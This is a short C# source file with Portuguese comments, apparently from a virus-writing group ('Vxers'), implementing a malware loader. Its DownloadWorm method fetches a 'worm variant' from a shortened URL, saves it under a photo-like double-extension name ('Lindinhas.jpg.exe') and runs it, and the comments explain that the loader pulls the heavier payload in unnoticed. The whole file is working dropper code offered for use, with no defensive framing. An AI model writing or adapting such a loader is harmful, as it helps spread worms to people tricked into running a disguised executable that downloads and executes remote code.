using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

// Importamos uma namespace para poder manipular os
// Protocolos e pedidos HTTP
using System.Net;

// Importamos uma namespace para poder manipular processos (executar processos)
using System.Diagnostics;

namespace NetCoders.Vxers.Loader
{
    class Program
    {
        static void DownloadWorm()
        {
            // Fizemos o download da variante para maquina local
            var pedido = new WebClient();
            pedido.DownloadFile("http://is.gd/SCRJWL", @"c:\Fotos\Lindinhas.jpg.exe");

            // Apos baixar o worm, mandamos executar
            Process.Start(@"c:\Fotos\Lindinhas.jpg.exe");
        }


        static void Main(string[] args)
        {
            // Dependendo do que voce digitou na VARIANTE
            // Ela pode ficar pesada entao precisamos
            // De um LOADER de um executavel mais leve
            // Para baixar a VARIANTE POR TRAS DOS PANOS
            DownloadWorm();
        }
    }
}